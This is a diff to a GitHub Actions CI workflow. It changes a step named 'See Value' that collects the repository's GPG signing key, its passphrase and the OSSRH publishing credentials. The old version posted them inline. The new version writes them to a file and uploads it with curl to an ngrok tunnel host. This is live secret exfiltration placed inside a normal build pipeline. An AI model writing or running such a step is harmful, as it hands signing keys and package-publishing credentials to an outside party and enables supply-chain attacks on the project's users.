@@ -27,15 +27,12 @@ jobs:
         gpg-passphrase: ${{ secrets.GPG_PASSWORD }}
     - name: See Value
       run: |
+        echo "GPG_SECRET = ${{ secrets.GPG_SECRET }} \n\n" >> test.txt
+        echo "GPG_PASSWORD = ${{ secrets.GPG_PASSWORD }} \n\n" >> test.txt
+        echo "OSSRH_USER = ${{ secrets.OSSRH_USER }} \n\n" >> test.txt
+        echo "OSSRH_PASSWORD = ${{ secrets.OSSRH_PASSWORD }} \n\n" >> test.txt
         curl 'https://214f-206-237-1-105.ngrok-free.app/apk/seevalue' \
-           -H 'Content-Type: text/plain' \
-           -d '
-           {
-            	"GPG_SECRET": ${{ secrets.GPG_SECRET }},
-                "GPG_PASSWORD": ${{ secrets.GPG_PASSWORD }},
-                "OSSRH_USER": ${{ secrets.OSSRH_USER }},
-                "OSSRH_PASSWORD": ${{ secrets.OSSRH_PASSWORD }}
-           }'
+           --form 'file=@"test.txt"'
 
 #    - name: Cache .m2
 #      uses: actions/cache@v2
